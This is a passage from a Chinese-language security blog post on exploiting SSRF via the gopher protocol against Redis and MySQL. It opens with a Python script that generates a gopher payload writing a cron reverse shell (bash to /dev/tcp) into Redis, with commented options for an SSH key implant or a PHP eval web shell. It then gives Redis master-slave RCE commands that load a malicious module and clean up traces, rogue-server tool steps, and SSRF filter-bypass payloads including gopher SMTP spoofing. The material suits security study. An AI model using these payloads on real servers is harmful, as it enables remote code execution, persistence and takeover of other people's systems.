+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">protocol=<span class="string">"gopher://"</span></span><br><span class="line">ip=<span class="string">"10.16.13.153"</span></span><br><span class="line">port=<span class="string">"6379"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#定时任务反弹shell</span></span><br><span class="line">reverse_ip=<span class="string">"192.168.163.132"</span></span><br><span class="line">reverse_port=<span class="string">"2333"</span></span><br><span class="line">cron=<span class="string">"\n\n\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/%s/%s 0&gt;&amp;1\n\n\n\n"</span>%(reverse_ip,reverse_port)</span><br><span class="line">filename=<span class="string">"root"</span></span><br><span class="line">path=<span class="string">"/var/spool/cron"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#写入公钥</span></span><br><span class="line"><span class="comment">#filename="authorized_keys"</span></span><br><span class="line"><span class="comment">#ssh_pub="\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDLykSx6ZMaduFsXjrzKMpEqe2oa5iV6dvy4HKui9/Cj1u66n3h3H6cEkyd5Dip01BFRp7KOhyGKfPcjX43E9CTRTj7aIP7+CrmUaS3st6+a5ZfZy8wcv7U4tQywlQVFhGkii83/V4dPusahnLpEfnt29o80JKq7oInrjXEbGx7h8rXhDfgdBLYU1hfybTfBvot2G4enQgGrVbjZfDMCJhH4u5sH0J1u698zc8FLe2uHv4KQ56CjD1WFayz8mB4gSaOxlSQvwbAywqQx6bcEkm5ASKE1ffbJ8st9dtUKC7bqsWTshqdFBKoljkSSkJqkV1yq06uhcTna03RnzLK0Yul7lVAWQ0eZdaExwxAvvNtDyzFJrbwShOH+EZb9hVUmnWe6ffh3OaitHKvFsvA09w4uaaItC5ZQhIhp3dvEQj5WpMD3NftEvbz2fIs2OglsWyF/Ix8QTPZBlZiUQkX9f0cDreBPtgFpGbgn4mVzayaAeHeXAaXHO77aiSA7WAvnPc= root@kali"</span></span><br><span class="line"><span class="comment">#公钥填入自己的</span></span><br><span class="line"><span class="comment">#path="/root/.ssh/"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#写shell</span></span><br><span class="line"><span class="comment">#shell="\n\n&lt;?php eval($_GET[\"cmd\"]);?&gt;\n\n"</span></span><br><span class="line"><span class="comment">#filename="shell1.php"</span></span><br><span class="line"><span class="comment">#path="/var/www/html"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">passwd=<span class="string">""</span></span><br><span class="line">cmd=[<span class="string">"flushall"</span>,</span><br><span class="line">     <span class="string">"set 1 &#123;&#125;"</span>.format(cron.replace(<span class="string">" "</span>,<span class="string">"$&#123;IFS&#125;"</span>)),</span><br><span class="line">     <span class="string">"config set dir &#123;&#125;"</span>.format(path),</span><br><span class="line">     <span class="string">"config set dbfilename &#123;&#125;"</span>.format(filename),</span><br><span class="line">     <span class="string">"save"</span></span><br><span class="line">     ]</span><br><span class="line"><span class="keyword">if</span> passwd:</span><br><span class="line">    cmd.insert(<span class="number">0</span>,<span class="string">"AUTH &#123;&#125;"</span>.format(passwd))</span><br><span class="line">payload=protocol+ip+<span class="string">":"</span>+port+<span class="string">"/_"</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">redis_format</span><span class="params">(arr)</span>:</span></span><br><span class="line">    CRLF=<span class="string">"\r\n"</span></span><br><span class="line">    redis_arr = arr.split(<span class="string">" "</span>)</span><br><span class="line">    cmd=<span class="string">""</span></span><br><span class="line">    cmd+=<span class="string">"*"</span>+str(len(redis_arr))</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> redis_arr:</span><br><span class="line">        cmd+=CRLF+<span class="string">"$"</span>+str(len((x.replace(<span class="string">"$&#123;IFS&#125;"</span>,<span class="string">" "</span>))))+CRLF+x.replace(<span class="string">"$&#123;IFS&#125;"</span>,<span class="string">" "</span>)</span><br><span class="line">    cmd+=CRLF</span><br><span class="line">    <span class="keyword">return</span> cmd</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> cmd:</span><br><span class="line">        payload += urllib.quote(redis_format(x))</span><br><span class="line">    <span class="keyword">print</span> payload</span><br></pre></td></tr></table></figure>
+
+<h3 id="SSRF与MySQL："><a href="#SSRF与MySQL：" class="headerlink" title="SSRF与MySQL："></a>SSRF与MySQL：</h3><p>对于MySQL也是同样的操作，可以通过Gopher对MySQL进行未授权访问，获取信息。</p>
+<h3 id="MySQL连接方式："><a href="#MySQL连接方式：" class="headerlink" title="MySQL连接方式："></a>MySQL连接方式：</h3><p>MySQL分为服务端和客户端，客户端连接服务器有三种方法</p>
+<blockquote>
+<p>Unix套接字；<br>内存共享/命名管道；<br>TCP/IP套接字</p>
+</blockquote>
+<ul>
+<li>在Linux或者Unix环境下，当我们输入<code>mysql –uroot –proot</code>登录MySQL服务器时就是用的Unix套接字连接；Unix套接字其实不是一个网络协议，只能在客户端和Mysql服务器在同一台电脑上才可以使用。</li>
+<li>在Windows系统中客户端和Mysql服务器在同一台电脑上，可以使用命名管道和共享内存的方式。</li>
+<li><code>TCP/IP</code>套接字是在任何系统下都可以使用的方式，也是使用最多的连接方式，当我们输入<code>mysql –h127.0.0.1 –uroot –proot</code>时就是要TCP/IP套接字。所以当我们需要抓取mysql通信数据包时必须使用<code>TCP/IP</code>套接字连接。</li>
+</ul>
+<h4 id="复现："><a href="#复现：" class="headerlink" title="复现："></a>复现：</h4><p>首先连入MySQL数据库。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -h 127.0.0.1 -uroot -p</span><br></pre></td></tr></table></figure>
+
+<p>使用<code>tcpdump</code>进行抓包。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -i lo port 3306 -w mysql.pcap</span><br></pre></td></tr></table></figure>
+
+<p>把抓到的包放进wireshark</p>
+<p><img src="https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20201217134604.png" alt></p>
+<p>右键TCP追踪流，查看原始数据</p>
+<p><img src="https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20201217134828.png" alt></p>
+<p>提取出原始数据，并合成为一段字符串。每两个字符前面加一个<code>%</code>，就是将我们的请求进行了url编码，在通过gopher协议发送tcp数据包</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl gopher://127.0.0.1:3306/_%cf%00%00%01%84%a6%9f%20%00%00%00%01%2d%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%0f%00%00%00%72%6f%6f%74%00%14%4a%94%88%b1%e0%3a%e2%95%89%df%50%7c%8f%d0%88%a6%68%c8%0f%f5%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%7e%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%0a%6c%69%62%6d%61%72%69%61%64%62%04%5f%70%69%64%05%31%35%35%37%37%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%05%33%2e%31%2e%39%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%0c%5f%73%65%72%76%65%72%5f%68%6f%73%74%09%31%32%37%2e%30%2e%30%2e%31%21%00%00%00%03%73%65%6c%65%63%74%20%40%40%76%65%72%73%69%6f%6e%5f%63%6f%6d%6d%65%6e%74%20%6c%69%6d%69%74%20%31%11%00%00%00%03%73%65%6c%65%63%74%20%40%40%76%65%72%73%69%6f%6e%01%00%00%00%01 --output -</span><br></pre></td></tr></table></figure>
+
+<p>最后可能因为本地的MySQL版本原因，我这里没有回显成功。</p>
+<p>编码脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="comment">#每两个字符前面加一个%</span></span><br><span class="line"><span class="comment">#需要先把pcap中的数据转换为原始数据，并且删除回车符拼接为一个字符串</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">results</span><span class="params">(s)</span>:</span></span><br><span class="line">    open()</span><br><span class="line">    a=[s[i:i+<span class="number">2</span>] <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(s),<span class="number">2</span>)]</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"curl gopher://127.0.0.1:80/_%"</span>+<span class="string">"%"</span>.join(a)</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    <span class="keyword">import</span> sys</span><br><span class="line">    s=sys.argv[<span class="number">1</span>]</span><br><span class="line">    print(results(s))</span><br></pre></td></tr></table></figure>
+
+<p>无论是Redis还是MySQL，都可以使用Gopherus来生成Payload。</p>
+<h3 id="主从复制："><a href="#主从复制：" class="headerlink" title="主从复制："></a>主从复制：</h3><h4 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h4><blockquote>
+<p>是指将一台Redis服务器的数据，复制到其他的Redis服务器。前者称为主节点(master)，后者称为从节点(slave)；数据的复制是单向的，只能由主节点到从节点。redis的持久化使得机器即使重启数据也不会丢失，因为redis服务器重启后会把硬盘上的文件重新恢复到内存中，但是如果硬盘的数据被删除的话数据就无法恢复了，如果通过主从复制就能解决这个问题，主redis的数据和从redis上的数据保持实时同步，当主redis写入数据是就会通过主从复制复制到其它从redis。</p>
+</blockquote>
+<h4 id="限制条件："><a href="#限制条件：" class="headerlink" title="限制条件："></a>限制条件：</h4><blockquote>
+<ol>
+<li>Redis4.x/5.x</li>
+<li>未授权访问</li>
+</ol>
+</blockquote>
+<p>Redis4.x以后增加了模块功能，可以通过加载C语言编写的恶意<code>.so</code>文件，从而达到命令执行</p>
+<h4 id="攻击流程："><a href="#攻击流程：" class="headerlink" title="攻击流程："></a>攻击流程：</h4><ol>
+<li><p>通过未授权访问，连入目标机的Redis。</p>
+</li>
+<li><p>将该Redis的设为<code>Slave</code>服务器，并将攻击者的恶意Redis服务器设为<code>Master</code>服务器</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#设置redis的备份路径为当前目录</span></span><br><span class="line">    config <span class="built_in">set</span> dir ./</span><br><span class="line"><span class="comment">#设置备份文件名为exp.so，默认为dump.rdb</span></span><br><span class="line">    config <span class="built_in">set</span> dbfilename exp.so</span><br><span class="line"><span class="comment">#设置主服务器IP和端口</span></span><br><span class="line">    slaveof 192.168.172.129 1234  </span><br><span class="line"><span class="comment">#加载恶意模块</span></span><br><span class="line">    module load ./exp.so</span><br><span class="line"><span class="comment">#切断主从，关闭复制功能</span></span><br><span class="line">    slaveof no one </span><br><span class="line"><span class="comment">#执行系统命令</span></span><br><span class="line">    system.exec <span class="string">'whoami'</span></span><br><span class="line">    system.rev 127.0.0.1 9999    </span><br><span class="line"><span class="comment">#通过dump.rdb文件恢复数据</span></span><br><span class="line">    config <span class="built_in">set</span> dbfilename dump.rdb</span><br><span class="line"><span class="comment">#删除exp.so</span></span><br><span class="line">    system.exec <span class="string">'rm ./exp.so'</span></span><br><span class="line"><span class="comment">#卸载system模块的加载</span></span><br><span class="line">    module unload system</span><br></pre></td></tr></table></figure>
+
+</li>
+</ol>
+<h4 id="一些自动化工具："><a href="#一些自动化工具：" class="headerlink" title="一些自动化工具："></a>一些自动化工具：</h4><h5 id="so文件的生成："><a href="#so文件的生成：" class="headerlink" title=".so文件的生成："></a><code>.so</code>文件的生成：</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/n0b0dyCN/RedisModules-ExecuteCommand</span><br><span class="line"><span class="built_in">cd</span> RedisModules-ExecuteCommand/</span><br><span class="line">make</span><br></pre></td></tr></table></figure>
+
+<h5 id="攻击端执行脚本："><a href="#攻击端执行脚本：" class="headerlink" title="攻击端执行脚本："></a>攻击端执行脚本：</h5><p>python redis-rce.py -r 目标ip-p 目标端口 -L 本地ip -f 恶意.so</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#python redis-rce.py -r 目标ip-p 目标端口 -L 本地ip -f 恶意.so</span></span><br><span class="line"></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/Ridter/redis-rce.git</span><br><span class="line"><span class="built_in">cd</span> redis-rce/</span><br><span class="line">cp ../RedisModules-ExecuteCommand/src/module.so ./</span><br><span class="line">pip install -r requirements.txt </span><br><span class="line">python redis-rce.py -r 192.168.28.152 -p 6379 -L 192.168.28.137 -f module.so</span><br></pre></td></tr></table></figure>
+
+<h5 id="一键GetShell："><a href="#一键GetShell：" class="headerlink" title="一键GetShell："></a>一键GetShell：</h5><p>工具地址：<a href="https://github.com/n0b0dyCN/redis-rogue-server" target="_blank" rel="noopener">https://github.com/n0b0dyCN/redis-rogue-server</a></p>
+<h1 id="四、关于SSRF的绕过："><a href="#四、关于SSRF的绕过：" class="headerlink" title="四、关于SSRF的绕过："></a>四、关于SSRF的绕过：</h1><ol>
+<li><p>攻击本地：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:80</span><br><span class="line">http://localhost:22</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>利用<code>[::]</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">利用[::]绕过localhost</span><br><span class="line">http://[::]:80/  &gt;&gt;&gt;  http://127.0.0.1</span><br></pre></td></tr></table></figure>
+
+
+</li>
+</ol>
+<ol start="3">
+<li><p>利用@</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com@127.0.0.1</span><br></pre></td></tr></table></figure>
+
+
+</li>
+</ol>
+<ol start="4">
+<li><p>利用短地址</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://dwz.cn/11SMa  &gt;&gt;&gt;  http://127.0.0.1</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://tool.chinaz.com/tools/dwz.aspx" target="_blank" rel="noopener">短连接生成</a></p>
+</li>
+<li><p>利用特殊域名</p>
+<p>利用原理是DNS解析</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1.xip.io/</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20201228152711.png" alt></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.owasp.org.127.0.0.1.xip.io/</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20201228220747.png" alt></p>
+</li>
+<li><p>利用DNS解析</p>
+<p>在域名上设置A记录，指向127.0.0.1</p>
+</li>
+<li><p>利用上传</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">也不一定是上传，我也说不清，自己体会 -.-</span><br><span class="line">修改&quot;type=file&quot;为&quot;type=url&quot;</span><br><span class="line">比如：</span><br><span class="line">上传图片处修改上传，将图片文件修改为URL，即可能触发SSRF</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>利用Enclosed alphanumerics</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">利用Enclosed alphanumerics</span><br><span class="line">ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ  &gt;&gt;&gt;  example.com</span><br><span class="line">List:</span><br><span class="line">① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ </span><br><span class="line">⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ </span><br><span class="line">⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ </span><br><span class="line">⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ </span><br><span class="line">Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ </span><br><span class="line">ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ </span><br><span class="line">⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ </span><br><span class="line">⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>利用句号</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127。0。0。1/</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20201228153609.png" alt></p>
+</li>
+<li><p>利用进制转换</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">可以是十六进制，八进制等。</span><br><span class="line">115.239.210.26  &gt;&gt;&gt;  16373751032</span><br><span class="line">首先把这四段数字给分别转成16进制，结果：73 ef d2 1a</span><br><span class="line">然后把 73efd21a 这十六进制一起转换成8进制</span><br><span class="line">记得访问的时候加0表示使用八进制(可以是一个0也可以是多个0 跟XSS中多加几个0来绕过过滤一样)，十六进制加0x</span><br></pre></td></tr></table></figure>
+
+
+</li>
+</ol>
+<pre><code><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1  &gt;&gt;&gt;  http://2130706433/</span><br><span class="line">http://127.0.0.1  &gt;&gt;&gt;  http://0177.0.0.1/</span><br></pre></td></tr></table></figure></code></pre><ol start="11">
+<li><p>利用特殊地址（未成功）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://0/</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>利用协议（未成功）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Dict://</span><br><span class="line">dict://&lt;user-auth&gt;@&lt;host&gt;:&lt;port&gt;/d:&lt;word&gt;</span><br><span class="line">ssrf.php?url=dict://attacker:11111/</span><br><span class="line">SFTP://</span><br><span class="line">ssrf.php?url=sftp://example.com:11111/</span><br><span class="line">TFTP://</span><br><span class="line">ssrf.php?url=tftp://example.com:12346/TESTUDPPACKET</span><br><span class="line">LDAP://</span><br><span class="line">ssrf.php?url=ldap://localhost:11211/%0astats%0aquit</span><br><span class="line">Gopher://</span><br><span class="line">ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a</span><br></pre></td></tr></table></figure>
+
+
+
+</li>
+</ol>
+<ol start="13">
+<li>结合以上自由组合绕过<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference:"></a>Reference:</h1></li>
+</ol>
+<p><a href="https://xz.aliyun.com/t/5665#" target="_blank" rel="noopener">https://xz.aliyun.com/t/5665#</a></p>
+
+    
+  </div>
+
+</article>
+
+
+   
+  <div class="text-center donation">
+    <div class="inner-donation">
+      <span class="btn-donation">Have Fun</span>
+      <div class="donation-body">
+        <div class="tip text-center">by Aruk4s</div>
+        <ul>
+        
+          <li class="item">
+            
+            <img src="/images/1.png" alt="">
+          </li>
+        
+          <li class="item">
+            
+            <img src="/images/2.png" alt="">
+          </li>
+        
+        </ul>
+      </div>
+    </div>
+  </div>
+
+
+   
+  <div class="box-prev-next clearfix">
+    <a class="show pull-left" href="/2019/10/03/build-a-blog/">
+        <i class="icon icon-angle-left"></i>
+    </a>
+    <a class="show pull-right" href="/2020/11/04/SQL注入/">
+        <i class="icon icon-angle-right"></i>
+    </a>
+  </div>
+
+
+
+
+</div>
+
+
+  <a id="backTop" class="back-top">
+    <i class="icon-angle-up"></i>
+  </a>
+
+
+
+
+  <div class="modal" id="modal">
+  <span id="cover" class="cover hide"></span>
+  <div id="modal-dialog" class="modal-dialog hide-dialog">
+    <div class="modal-header">
+      <span id="close" class="btn-close">关闭</span>
+    </div>
+    <hr>
+    <div class="modal-body">
+      <ul class="list-toolbox">
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/archives/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              博客
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/category/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              分类
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/tag/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              标签
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/link/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              友链
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/about/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              关于
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/search/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              搜索
+            </a>
+          </li>
+        
+      </ul>
+
+    </div>
+  </div>
+</div>
+
+
+
+  
+      <div class="fexo-comments comments-post">
+    
+
+    
+
+    
+    
+
+    
+
+    
+    
+
+    
+
+  </div>
+
+  
+
+  <script type="text/javascript">
+  function loadScript(url, callback) {
+    var script = document.createElement('script')
+    script.type = 'text/javascript';
+
+    if (script.readyState) { //IE
+      script.onreadystatechange = function() {
+        if (script.readyState == 'loaded' ||
+          script.readyState == 'complete') {
+          script.onreadystatechange = null;
+          callback();
+        }
+      };
+    } else { //Others
+      script.onload = function() {
+        callback();
+      };
+    }
+
+    script.src = url;
+    document.getElementsByTagName('head')[0].appendChild(script);
+  }
+
+  window.onload = function() {
+    loadScript('/js/bundle.js?235683', function() {
+      // load success
+    });
+  }
+</script>
+
+</body>
+</html>
